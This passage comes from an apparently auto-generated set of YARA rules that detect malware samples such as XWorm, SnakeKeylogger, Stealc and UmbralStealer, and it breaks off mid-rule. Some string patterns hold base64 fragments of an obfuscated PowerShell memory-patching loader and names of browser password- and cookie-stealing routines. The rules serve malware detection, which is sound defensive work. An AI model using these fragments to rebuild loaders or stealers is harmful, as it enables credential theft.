      reference = "internal"
      date = "2025-09-28"
      hash1 = "326bcb8456524b7a385028d507b09df71fb56dde16100fa3f753a10d59f4c752"
      hash2 = "5363b10f3f97233cd110918e516973fadba750d34b48af44fd82db21fd16fecb"
      hash3 = "56f83bfe28f6d3cfae33f45b37d90f68077ec5abdcb1274718cffd01321afe0c"
      hash4 = "79ee7e3483bb6b0aa47f3fb7eb00f5f2d997122917ac02d8205ed4caa595ff09"
      hash5 = "80137adaaf51e05ae42cb1f80c1614fbbe39197a45c9d6b236ab9417617fe510"
      hash6 = "8d9f89a3d7274e8e782abff4719f4d161c48a85392ab12a18ecf09b4ea374c09"
   strings:
      $s1 = "Event Log Analysis Report - " fullword wide /* score: '20.00'*/
      $s2 = "EventLog_Analysis_{0}_{1:yyyyMMdd_HHmmss}.txt" fullword wide /* score: '19.00'*/
      $s3 = "Error getting statistics for event log '" fullword wide /* score: '17.00'*/
      $s4 = "Error getting available event logs: " fullword wide /* score: '17.00'*/
      $s5 = "Error getting entry count for event log '" fullword wide /* score: '17.00'*/
      $s6 = "Event Log Analyzer - v1.0" fullword wide /* score: '17.00'*/
      $s7 = "labelLogInfo" fullword wide /* score: '15.00'*/
      $s8 = "UpdateLogInfo" fullword ascii /* score: '15.00'*/
      $s9 = "EventLogAnalyzer.Forms.ErrorPatternForm.resources" fullword ascii /* score: '15.00'*/
      $s10 = "Error reading event log '" fullword wide /* score: '15.00'*/
      $s11 = "EventLog_Analysis_{0}_{1:yyyyMMdd_HHmmss}.csv" fullword wide /* score: '15.00'*/
      $s12 = "<GetAvailableEventLogs>b__6_0" fullword ascii /* score: '14.00'*/
      $s13 = "GetAvailableEventLogs" fullword ascii /* score: '14.00'*/
      $s14 = "GetEventLogEntryCount" fullword ascii /* score: '14.00'*/
      $s15 = "<GetEventLogStatistics>b__5_0" fullword ascii /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _SnakeKeylogger_signature__SnakeKeylogger_signature__XWorm_signature__4688f521_27 {
   meta:
      description = "_subset_batch - from files SnakeKeylogger(signature).iso, SnakeKeylogger(signature).js, XWorm(signature)_4688f521.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "8165c49a33391054cb0fe9ce0bd83750db712e06e3dd9c9fb045362c39e6f635"
      hash2 = "08b7bf7e1d6352de37f7f1ec8cb7a49932590a68a7fab707e160cd086b0f8ee6"
      hash3 = "4688f5214c1e27375d0aa23750ab273dac22a7fa79d178ca2c3faf220d0820a5"
   strings:
      $s1 = "ADYAOQAsADEAMQA2ACwAMQAxADkALAA2ADkALAAxADEAOAAsADEAMAAxACwAMQAxADAALAAxADEANgAsADgANwAsADEAMQA0ACwAMQAwADUALAAxADEANgAsADEAMAAx" ascii /* base64 encoded string ' 6 9 , 1 1 6 , 1 1 9 , 6 9 , 1 1 8 , 1 0 1 , 1 1 0 , 1 1 6 , 8 7 , 1 1 4 , 1 0 5 , 1 1 6 , 1 0 1' */ /* score: '21.00'*/
      $s2 = "AGUATQBlAG0AbwByAHkATQBhAG4AYQBnAGUAcgAgAD0AIABbAFIAdQBuAHQAaQBtAGUALgBJAG4AdABlAHIAbwBwAFMAZQByAHYAaQBjAGUAcwAuAE0AYQByAHMAaABh" ascii /* base64 encoded string ' e M e m o r y M a n a g e r   =   [ R u n t i m e . I n t e r o p S e r v i c e s . M a r s h a' */ /* score: '21.00'*/
      $s3 = "AHkAKAAkAGIAdQBsAGwAZQB0AEEAcwBzAGUAbQBiAGwAeQBOAGEAbQBlACwAIABbAFMAeQBzAHQAZQBtAC4AUgBlAGYAbABlAGMAdABpAG8AbgAuAEUAbQBpAHQALgBB" ascii /* base64 encoded string ' y ( $ b u l l e t A s s e m b l y N a m e ,   [ S y s t e m . R e f l e c t i o n . E m i t . A' */ /* score: '21.00'*/
      $s4 = "AG4AdABpAG0AZQAuAEkAbgB0AGUAcgBvAHAAUwBlAHIAdgBpAGMAZQBzAC4ASABhAG4AZABsAGUAUgBlAGYAKABbAEkAbgB0AFAAdAByAF0AOgA6AFoAZQByAG8ALAAg" ascii /* base64 encoded string ' n t i m e . I n t e r o p S e r v i c e s . H a n d l e R e f ( [ I n t P t r ] : : Z e r o ,  ' */ /* score: '21.00'*/
      $s5 = "AGMAZQAgAD0AIABHAGUAdAAtAEIAYQB0AHQAbABlAGYAaQBlAGwAZABJAG4AdABlAHIAZgBhAGMAZQAgAC0ARwByAGUAbgBhAGQAZQBMAGkAYgByAGEAcgB5AE4AYQBt" ascii /* base64 encoded string ' c e   =   G e t - B a t t l e f i e l d I n t e r f a c e   - G r e n a d e L i b r a r y N a m' */ /* score: '21.00'*/
      $s6 = "AHIAZQBuAGEAZABlAE0AZQBtAG8AcgB5AE0AYQBuAGEAZwBlAHIAOgA6AFIAZQBhAGQASQBuAHQAMwAyACgAWwBJAG4AdABQAHQAcgBdACgAJAB3AGUAYQBwAG8AbgBC" ascii /* base64 encoded string ' r e n a d e M e m o r y M a n a g e r : : R e a d I n t 3 2 ( [ I n t P t r ] ( $ w e a p o n B' */ /* score: '21.00'*/
      $s7 = "ACQARwByAGUAbgBhAGQAZQBUAGEAcgBnAGUAdABBAGQAZAByAGUAcwBzACwAIAA4ACwAIAAwAHgANAAwACwAIABbAHIAZQBmAF0AJABnAHIAZQBuAGEAZABlAE8AbABk" ascii /* base64 encoded string ' $ G r e n a d e T a r g e t A d d r e s s ,   8 ,   0 x 4 0 ,   [ r e f ] $ g r e n a d e O l d' */ /* score: '21.00'*/
      $s8 = "AHMALAAgADgALAAgACQAZwByAGUAbgBhAGQAZQBPAGwAZABQAHIAbwB0AGUAYwB0AGkAbwBuACwAIABbAHIAZQBmAF0AJABnAHIAZQBuAGEAZABlAE8AbABkAFAAcgBv" ascii /* base64 encoded string ' s ,   8 ,   $ g r e n a d e O l d P r o t e c t i o n ,   [ r e f ] $ g r e n a d e O l d P r o' */ /* score: '21.00'*/
      $s9 = "AG4AdABlAHIAZgBhAGMAZQAgAD0AIAAkAGIAdQBsAGwAZQB0AEQAZQBjAG8AZABlAHIALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAZwByAGUAbgBhAGQAZQBDAG8AbgB2" ascii /* base64 encoded string ' n t e r f a c e   =   $ b u l l e t D e c o d e r . G e t S t r i n g ( $ g r e n a d e C o n v' */ /* score: '21.00'*/
      $s10 = "AGwAZQBkACwAQQBuAHMAaQBDAGwAYQBzAHMALABBAHUAdABvAEMAbABhAHMAcwAnACwAIABbAFMAeQBzAHQAZQBtAC4ATQB1AGwAdABpAGMAYQBzAHQARABlAGwAZQBn" ascii /* base64 encoded string ' l e d , A n s i C l a s s , A u t o C l a s s ' ,   [ S y s t e m . M u l t i c a s t D e l e g' */ /* score: '21.00'*/
      $s11 = "AE0AYQBuAGEAZwBlAHIAOgA6AFIAZQBhAGQASQBuAHQAMwAyACgAWwBJAG4AdABQAHQAcgBdACgAJABiAHUAbABsAGUAdABTAGUAcgB2AGkAYwBlAEMAbwBuAHQAZQB4" ascii /* base64 encoded string ' M a n a g e r : : R e a d I n t 3 2 ( [ I n t P t r ] ( $ b u l l e t S e r v i c e C o n t e x' */ /* score: '21.00'*/
      $s12 = "AGEAdABpAG8AbgBGAGwAYQBnAHMAKABbAFMAeQBzAHQAZQBtAC4AUgBlAGYAbABlAGMAdABpAG8AbgAuAE0AZQB0AGgAbwBkAEkAbQBwAGwAQQB0AHQAcgBpAGIAdQB0" ascii /* base64 encoded string ' a t i o n F l a g s ( [ S y s t e m . R e f l e c t i o n . M e t h o d I m p l A t t r i b u t' */ /* score: '21.00'*/
      $s13 = "AGUATQBlAG0ATQBhAG4AYQBnAGUAcgA6ADoAVwByAGkAdABlAEIAeQB0AGUAKABbAEkAbgB0AFAAdAByAF0AOgA6AEEAZABkACgAJABHAHIAZQBuAGEAZABlAFQAYQBy" ascii /* base64 encoded string ' e M e m M a n a g e r : : W r i t e B y t e ( [ I n t P t r ] : : A d d ( $ G r e n a d e T a r' */ /* score: '21.00'*/
      $s14 = "AEEAZABkAHIAZQBzAHMAIABAACgAWwBJAG4AdABQAHQAcgBdACwAWwBVAEkAbgB0ADMAMgBdACwAWwBVAEkAbgB0ADMAMgBdACwAWwBVAEkAbgB0ADMAMgBdAC4ATQBh" ascii /* base64 encoded string ' A d d r e s s   @ ( [ I n t P t r ] , [ U I n t 3 2 ] , [ U I n t 3 2 ] , [ U I n t 3 2 ] . M a' */ /* score: '21.00'*/
      $s15 = "AE4AZQB1AHQAcgBhAGwAaQB6AGEAdABpAG8AbgBSAGUAcwB1AGwAdAAgAD0AIABFAHgAZQBjAHUAdABlAC0AQwBvAG0AYgBhAHQAUwBlAGMAdQByAGkAdAB5AE4AZQB1" ascii /* base64 encoded string ' N e u t r a l i z a t i o n R e s u l t   =   E x e c u t e - C o m b a t S e c u r i t y N e u' */ /* score: '21.00'*/
   condition:
      ( ( uint16(0) == 0x0000 or uint16(0) == 0x6176 ) and filesize < 800KB and ( 8 of them )
      ) or ( all of them )
}

rule _VIPKeylogger_signature__XWorm_signature__443c070f_28 {
   meta:
      description = "_subset_batch - from files VIPKeylogger(signature).bat, XWorm(signature)_443c070f.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "de054d8f9b649022d29cfcf89c05e8468e765fb5a5543d25abe29b9e41a3abae"
      hash2 = "443c070f1d20b0821daf3107e55bf5e6efbb8d0f86e5806c76d597e43ea11be1"
   strings:
      $s1 = "GEAcgBnAGUAdABBAGQAZAByAGUAcwBzACwAIAA4ACwAIAAwAHgANAAwACwAIABbAHIAZQBmAF0AJABnAHIAZQBuAGEAZABlAE8AbABkAFAAcgBvAHQAZQBjAHQAaQBvA" ascii /* score: '11.00'*/
      $s2 = "HIAZQBuAGEAZABlAFIAZQBzAG8AbAB2AGUAcgAuAEkAbgB2AG8AawBlACgAJABuAHUAbABsACwAIABAACgAJABnAHIAZQBuAGEAZABlAEgAYQBuAGQAbABlAFIAZQBmA" ascii /* score: '11.00'*/
      $s3 = "FsAXQBdACQAQgB1AGwAbABlAHQASQBuAHAAdQB0AFAAYQByAGEAbQBlAHQAZQByAHMALAAgAFsAVAB5AHAAZQBdACQARwByAGUAbgBhAGQAZQBPAHUAdABwAHUAdABUA" ascii /* score: '11.00'*/
      $s4 = "EEAcwBzAGUAbQBiAGwAeQBOAGEAbQBlACwAIABbAFMAeQBzAHQAZQBtAC4AUgBlAGYAbABlAGMAdABpAG8AbgAuAEUAbQBpAHQALgBBAHMAcwBlAG0AYgBsAHkAQgB1A" ascii /* score: '11.00'*/
      $s5 = "G4AYQBkAGUATQBlAG0AbwByAHkATQBhAG4AYQBnAGUAcgA6ADoAUgBlAGEAZABJAG4AdAA2ADQAKABbAEkAbgB0AFAAdAByAF0AJABiAHUAbABsAGUAdABTAGUAcgB2A" ascii /* score: '11.00'*/
      $s6 = "CkAKQAKAH0ACgAKAGYAdQBuAGMAdABpAG8AbgAgAEkAbgBpAHQAaQBhAGwAaQB6AGUALQBDAG8AbQBiAGEAdABTAGUAYwB1AHIAaQB0AHkAUwBlAHIAdgBpAGMAZQAgA" ascii /* score: '11.00'*/
      $s7 = "D0AIAAkAGIAdQBsAGwAZQB0AEQAZQBjAG8AZABlAHIALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAZwByAGUAbgBhAGQAZQBDAG8AbgB2AGUAcgB0AGUAcgA6ADoARgByA" ascii /* score: '11.00'*/
      $s8 = "E0AYQByAHMAaABhAGwATQBhAG4AYQBnAGUAcgAgAD0AIABbAFIAdQBuAHQAaQBtAGUALgBJAG4AdABlAHIAbwBwAFMAZQByAHYAaQBjAGUAcwAuAE0AYQByAHMAaABhA" ascii /* score: '11.00'*/
      $s9 = "FIAZQBmAGwAZQBjAHQAaQBvAG4ALgBNAGUAdABoAG8AZABBAHQAdAByAGkAYgB1AHQAZQBzAF0AJwBQAHUAYgBsAGkAYwAsAEgAaQBkAGUAQgB5AFMAaQBnACwATgBlA" ascii /* score: '11.00'*/
      $s10 = "GUAbgBhAGQAZQBPAGwAZABQAHIAbwB0AGUAYwB0AGkAbwBuACwAIABbAHIAZQBmAF0AJABnAHIAZQBuAGEAZABlAE8AbABkAFAAcgBvAHQAZQBjAHQAaQBvAG4AKQAgA" ascii /* score: '11.00'*/
      $s11 = "GEAdABpAG8AbgBSAGUAcwB1AGwAdAAgAD0AIABFAHgAZQBjAHUAdABlAC0AQwBvAG0AYgBhAHQAUwBlAGMAdQByAGkAdAB5AE4AZQB1AHQAcgBhAGwAaQB6AGEAdABpA" ascii /* score: '11.00'*/
      $s12 = "GIAdQBsAGwAZQB0AFAAcgBvAHQAZQBjAHQAaQBvAG4AQQBkAGQAcgBlAHMAcwAgAEAAKABbAEkAbgB0AFAAdAByAF0ALABbAFUASQBuAHQAMwAyAF0ALABbAFUASQBuA" ascii /* score: '11.00'*/
      $s13 = "GUAcgBvAHAAUwBlAHIAdgBpAGMAZQBzAC4ASABhAG4AZABsAGUAUgBlAGYAKABbAEkAbgB0AFAAdAByAF0AOgA6AFoAZQByAG8ALAAgACQAYgB1AGwAbABlAHQATABpA" ascii /* score: '11.00'*/
      $s14 = "HQAdQByAG4AIAAkAGIAdQBsAGwAZQB0AEQAZQBjAG8AZABlAHIALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAZwByAGUAbgBhAGQAZQBDAG8AbgB2AGUAcgB0AGUAcgA6A" ascii /* score: '11.00'*/
      $s15 = "HMALAAgACQAZwByAGUAbgBhAGQAZQBJACkALAAgACQAYgB1AGwAbABlAHQAQgBhAGMAawB1AHAARABhAHQAYQBbACQAZwByAGUAbgBhAGQAZQBJAF0AKQAgAHwAIABPA" ascii /* score: '11.00'*/
   condition:
      ( ( uint16(0) == 0x6b25 or uint16(0) == 0x7425 ) and filesize < 600KB and ( 8 of them )
      ) or ( all of them )
}

rule _RustyStealer_signature__e028dd160a9b25bfd157794a3702c831_imphash__RustyStealer_signature__e028dd160a9b25bfd157794a3702c831__29 {
   meta:
      description = "_subset_batch - from files RustyStealer(signature)_e028dd160a9b25bfd157794a3702c831(imphash).exe, RustyStealer(signature)_e028dd160a9b25bfd157794a3702c831(imphash)_14198cd5.exe, RustyStealer(signature)_e028dd160a9b25bfd157794a3702c831(imphash)_25fc7620.exe, RustyStealer(signature)_e028dd160a9b25bfd157794a3702c831(imphash)_32496cbe.exe, RustyStealer(signature)_e028dd160a9b25bfd157794a3702c831(imphash)_385d4a90.exe, RustyStealer(signature)_e028dd160a9b25bfd157794a3702c831(imphash)_9a6e7696.exe, RustyStealer(signature)_e028dd160a9b25bfd157794a3702c831(imphash)_ba6656dc.exe, XWorm(signature)_fd07fba8b12ffe7192d601c00a748022(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "9032cfc2074c405dbcb967bfda8c8295d34db4f6cf56727d3a2f7fe4ce49abd9"
      hash2 = "14198cd53c85c8cdf6b19b3c915844bf51cea45b29133e20011dcdd754a1beae"
      hash3 = "25fc762046ac2e9fbb698eef51b0881d7b3af3e2038bf8c252004426a6af2f75"
      hash4 = "32496cbe8cc3943df120b5c8522e8e5b46c3b15f998353665a9c14a3c6d29ae6"
      hash5 = "385d4a9087e5c893d20a0fc259c492a1c78deee237918c95daf2acee8cd491c1"
      hash6 = "9a6e76963ad89a35960d46f32eec730c47e73598614a5e4bbc38b925ef4922e0"
      hash7 = "ba6656dc06382c80e283c8a587cbfc05f59fc6937dd1033663153889127915c2"
      hash8 = "39a43ccb4d5295214586a645cfd977031be5680cad5a316db4326c42ba3d91fd"
   strings:
      $s1 = "acceptaccept-charsetaccept-encodingaccept-languageaccept-rangesaccess-control-allow-credentialsaccess-control-allow-headersacces" ascii /* score: '27.00'*/
      $s2 = "mutex poisoned" fullword ascii /* score: '27.00'*/
      $s3 = "StreamRef::drop; mutex poisoned" fullword ascii /* score: '27.00'*/
      $s4 = "Switching ProtocolsProcessingOKCreatedAcceptedNon Authoritative InformationNo ContentReset ContentPartial ContentMulti-StatusAlr" ascii /* score: '25.00'*/
      $s5 = "attempted to use a condition variable with more than one mutex" fullword ascii /* score: '24.00'*/
      $s6 = "sec-websocket-versionserverset-cookiestrict-transport-securitytetrailertransfer-encodinguser-agentupgradeupgrade-insecure-reques" ascii /* score: '23.00'*/
      $s7 = "inactive streamunexpected frame typepayload too bigrejectedrelease capacity too bigstream ID overflowedmalformed headersrequest " ascii /* score: '23.00'*/
      $s8 = "runtime dropped the dispatch taskuser code panickedconnection closed" fullword ascii /* score: '20.00'*/
      $s9 = "tConflictGoneLength RequiredPrecondition FailedPayload Too LargeURI Too LongUnsupported Media TypeRange Not SatisfiableExpectati" ascii /* score: '19.00'*/
      $s10 = "assertion failed: head.len() + tail.len() <= 8" fullword ascii /* score: '19.00'*/
      $s11 = "on FailedI'm a teapotMisdirected RequestUnprocessable EntityLockedFailed DependencyUpgrade RequiredPrecondition RequiredToo Many" ascii /* score: '18.00'*/
      $s12 = "expectedMessageCanceledChannelClosedConnectBodyWriteShutdownMethodVersionVersionH2UriUriTooLongHeaderTooLargeInternalTokenConten" ascii /* score: '18.00'*/
      $s13 = "a spawned task panicked and the runtime is configured to shut down on unhandled panic" fullword ascii /* score: '18.00'*/
      $s14 = "alid HTTP header parsedinvalid content-length parsedunexpected transfer-encoding parsedmessage head is too largeinvalid HTTP sta" ascii /* score: '17.00'*/
      $s15 = "inactive streamunexpected frame typepayload too bigrejectedrelease capacity too bigstream ID overflowedmalformed headersrequest " ascii /* score: '17.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 6000KB and ( 8 of them )
      ) or ( all of them )
}

rule _XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__1af2e11c_XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_impha_30 {
   meta:
      description = "_subset_batch - from files XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_1af2e11c.exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d64ab84a.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1af2e11cbb60bee87efab50083b64d9051a8255c0b9143d9105703e5f2a2c588"
      hash2 = "d64ab84a35b237175b11da7a507e8744e03b6d3d7ddeab269a5c40e4f19467b2"
   strings:
      $s1 = "GetCharFromKeys" fullword ascii /* score: '12.00'*/
      $s2 = "get_ErrorBackgroundColor" fullword ascii /* score: '12.00'*/
      $s3 = "get_ControlKeyState" fullword ascii /* score: '12.00'*/
      $s4 = "get_PrivateData" fullword ascii /* score: '12.00'*/
      $s5 = "get_ErrorForegroundColor" fullword ascii /* score: '12.00'*/
      $s6 = "PSRunspace-Host" fullword wide /* score: '12.00'*/
      $s7 = "keyinfo" fullword ascii /* score: '11.00'*/
      $s8 = "ReadKey_Box" fullword ascii /* score: '10.00'*/
      $s9 = "get_DebugForegroundColor" fullword ascii /* score: '9.00'*/
      $s10 = "get_ParentActivityId" fullword ascii /* score: '9.00'*/
      $s11 = "get_ProgressBackgroundColor" fullword ascii /* score: '9.00'*/
      $s12 = "get_HelpMessage" fullword ascii /* score: '9.00'*/
      $s13 = "get_ProgressForegroundColor" fullword ascii /* score: '9.00'*/
      $s14 = "lbOperation" fullword ascii /* score: '9.00'*/
      $s15 = "get_WarningForegroundColor" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__68423530_XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a_31 {
   meta:
      description = "_subset_batch - from files SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_68423530.exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5cb3bf5f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6842353066cfb2ade54cb7aa3b853da9fda7fe9dab2fa98395d1f41e5de5b015"
      hash2 = "5cb3bf5f0c0abd19e74b72ed4560f7a5295db8e0d2cbb705976d1dd8e1f93fe0"
   strings:
      $s1 = "C:\\Users\\User\\Documents" fullword ascii /* score: '24.00'*/
      $s2 = "comparison_report_{0:yyyyMMdd_HHmmss}.txt" fullword wide /* score: '20.00'*/
      $s3 = "<ProcessorCount>k__BackingField" fullword ascii /* score: '15.00'*/
      $s4 = "set_ProcessorCount" fullword ascii /* score: '15.00'*/
      $s5 = "Baseline [{0:yyyy-MM-dd HH:mm:ss}] - CPU: {1:F1}%, Memory: {2:F1}%, Disk: {3:F1}%, Network: {4:F1} Mbps" fullword wide /* score: '15.00'*/
      $s6 = "Processors: {0}" fullword wide /* score: '15.00'*/
      $s7 = "Win32_Processor.DeviceID='CPU0'" fullword wide /* score: '15.00'*/
      $s8 = "SELECT Name, MaxClockSpeed FROM Win32_Processor" fullword wide /* score: '15.00'*/
      $s9 = "Comparison Results (Baseline 2 - Baseline 1)" fullword wide /* score: '15.00'*/
      $s10 = "GetDiskUsage" fullword ascii /* score: '14.00'*/
      $s11 = "GetCpuUsage" fullword ascii /* score: '14.00'*/
      $s12 = "GetCpuUsageAlternative" fullword ascii /* score: '14.00'*/
      $s13 = "GetDiskUsageAlternative" fullword ascii /* score: '14.00'*/
      $s14 = "GetMemoryUsageAlternative" fullword ascii /* score: '14.00'*/
      $s15 = "get_NetworkUsage" fullword ascii /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _Stealc_signature__646167cce332c1c252cdcb1839e0cf48_imphash__XWorm_signature__646167cce332c1c252cdcb1839e0cf48_imphash__32 {
   meta:
      description = "_subset_batch - from files Stealc(signature)_646167cce332c1c252cdcb1839e0cf48(imphash).exe, XWorm(signature)_646167cce332c1c252cdcb1839e0cf48(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "127cd0e4e2d1178264eeb84d6a91e1aa6183f172a5998b1ecb6589386499256b"
      hash2 = "cc9c97df5ee39250db09b1255781a5c6bd02a441a4ee24c3613bc6b863c01c04"
   strings:
      $s1 = " Shell32.DLL " fullword wide /* score: '24.00'*/
      $s2 = " OpenProcessToken.3" fullword wide /* score: '18.00'*/
      $s3 = " advpack.dll.H" fullword wide /* score: '16.00'*/
      $s4 = " Command /?." fullword wide /* score: '14.00'*/
      $s5 = "        <requestedExecutionLevel" fullword ascii /* score: '11.00'*/
      $s6 = "  <description>IExpress extraction tool</description>" fullword ascii /* score: '10.00'*/
      $s7 = "DSystem\\CurrentControlSet\\Control\\Session Manager" fullword ascii /* score: '10.00'*/
      $s8 = "     processorArchitecture=\"x86\"" fullword ascii /* score: '10.00'*/
      $s9 = "          processorArchitecture=\"x86\"" fullword ascii /* score: '10.00'*/
      $s10 = " Windows NT." fullword wide /* score: '9.00'*/
      $s11 = "/Q -- " fullword wide /* score: '9.00'*/
      $s12 = "/C -- " fullword wide /* score: '9.00'*/
      $s13 = "  <assemblyIdentity version=\"5.1.0.0\"" fullword ascii /* score: '8.00'*/
      $s14 = " GetProcAddress() " fullword wide /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 17000KB and pe.imphash() == "646167cce332c1c252cdcb1839e0cf48" and ( 8 of them )
      ) or ( all of them )
}

rule _UmbralStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__c6ff6203_UmbralStealer_signature__f34d5f2d4577ed6d9ceec5_33 {
   meta:
      description = "_subset_batch - from files UmbralStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_c6ff6203.exe, UmbralStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_cd38ac65.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c6ff62032c39ff25b2171f16b6bc9caa9d0f9b3a2e733899ffc78c628c788a76"
      hash2 = "cd38ac659e7c2d3ad28705c52c281983b28f4683e81bd61f3ba166b7c61cbc74"
   strings:
      $x1 = "<Picasso.payload.Components.Browsers.Opera+<GetPasswords>d__5" fullword ascii /* score: '34.00'*/
      $x2 = ">Picasso.payload.Components.Browsers.OperaGx+<GetPasswords>d__5" fullword ascii /* score: '34.00'*/
      $x3 = "9Picasso.payload.Components.Browsers.UR+<GetPasswords>d__5" fullword ascii /* score: '32.00'*/
      $x4 = "BPicasso.payload.Components.Browsers.EpicPrivacy+<GetPasswords>d__5" fullword ascii /* score: '32.00'*/
      $x5 = "BPicasso.payload.Components.Browsers.OperaGx+<GetEncryptionKey>d__3" fullword ascii /* score: '32.00'*/
      $s6 = ">Picasso.payload.Components.Browsers.Iridium+<GetPasswords>d__5" fullword ascii /* score: '29.00'*/
      $s7 = "<Picasso.payload.Components.Browsers.OperaGx+<GetCookies>d__6" fullword ascii /* score: '29.00'*/
      $s8 = ">Picasso.payload.Components.Browsers.Vivaldi+<GetPasswords>d__5" fullword ascii /* score: '29.00'*/
      $s9 = ";Picasso.payload.Components.Browsers.Edge+<GetPasswords>d__5" fullword ascii /* score: '29.00'*/
      $s10 = "<Picasso.payload.Components.Browsers.Brave+<GetPasswords>d__5" fullword ascii /* score: '29.00'*/
      $s11 = "@Picasso.payload.Components.Browsers.Opera+<GetEncryptionKey>d__3" fullword ascii /* score: '29.00'*/
      $s12 = "=Picasso.payload.Components.Browsers.Yandex+<GetPasswords>d__5" fullword ascii /* score: '29.00'*/
      $s13 = "?Picasso.payload.Components.Browsers.Chromium+<GetPasswords>d__5" fullword ascii /* score: '29.00'*/
      $s14 = ":Picasso.payload.Components.Browsers.Opera+<GetCookies>d__6" fullword ascii /* score: '29.00'*/
      $s15 = "=Picasso.payload.Components.Browsers.Comodo+<GetPasswords>d__5" fullword ascii /* score: '29.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 700KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _ValleyRAT_signature__d42595b695fc008ef2c56aabd8efd68e_imphash__018d7c99_Vidar_signature__4035d2883e01d64f3e7a9dccb1d63af5_i_34 {
   meta:
      description = "_subset_batch - from files ValleyRAT(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash)_018d7c99.exe, Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, Vidar(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "018d7c99435e7c6ad6fdb7e33e99005aa9a0b98d3571a361227240257ce72aca"
      hash2 = "23b2938d3c84a2157ba0a8347c1b62cf3f05dd5eaf53ddcea431efe6434c2074"
      hash3 = "0b00aac0ad26a93da08c1287ed349bcce15580a5a28d10a63659a9185894dac0"
   strings:
      $s1 = "runtime.mutexprofilerate" fullword ascii /* score: '21.00'*/
      $s2 = "runtime.processorVersionInfo" fullword ascii /* score: '21.00'*/
      $s3 = "runtime.execLock" fullword ascii /* score: '19.00'*/
      $s4 = "runtime.printBacklogIndex" fullword ascii /* score: '18.00'*/
      $s5 = "runtime.hashkey" fullword ascii /* score: '16.00'*/
      $s6 = "runtime.levelLogPages" fullword ascii /* score: '15.00'*/
      $s7 = "runtime.faketime" fullword ascii /* score: '15.00'*/
      $s8 = "runtime.fastlog2Table" fullword ascii /* score: '15.00'*/
      $s9 = "runtime.sweep" fullword ascii /* score: '15.00'*/
      $s10 = "runtime.printBacklog" fullword ascii /* score: '15.00'*/
      $s11 = "runtime.sysDirectoryLen" fullword ascii /* score: '14.00'*/
      $s12 = "runtime.data" fullword ascii /* score: '14.00'*/
      $s13 = "runtime.sysDirectory" fullword ascii /* score: '14.00'*/
      $s14 = "runtime.boundsNegErrorFmts" fullword ascii /* score: '13.00'*/
      $s15 = "runtime.floatError" fullword ascii /* score: '13.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 9000KB and ( 8 of them )
      ) or ( all of them )
}

rule _SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__32343ec3_SnakeKeylogger_signature__f34d5f2d4577ed6d9cee_35 {
   meta:
      description = "_subset_batch - from files SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_32343ec3.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_b341e585.exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_bca5317c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "32343ec3ac8ba2e51dc218f39d0e559922bfdc80d59f33c25fa8a48ed8563c5d"
      hash2 = "b341e58512a0b1f9fc16493ccda53da9046a88103580a880a7483b134f8b7f41"
      hash3 = "bca5317c27eb5f4a7816d00e8a0a20359ec8b72c46be5ad08d7f751583bed1d9"
   strings:
      $s1 = "Ampersand '&' should be encoded as '&amp;'" fullword wide /* score: '16.00'*/
      $s2 = "Attribute syntax error - attributes should be in format: name=\"value\"" fullword wide /* score: '15.00'*/
      $s3 = "HTML_Validation_Errors.txt" fullword wide /* score: '14.00'*/
      $s4 = "get_HTMLVersion" fullword ascii /* score: '12.00'*/
      $s5 = "get_SaveValidationReports" fullword ascii /* score: '12.00'*/
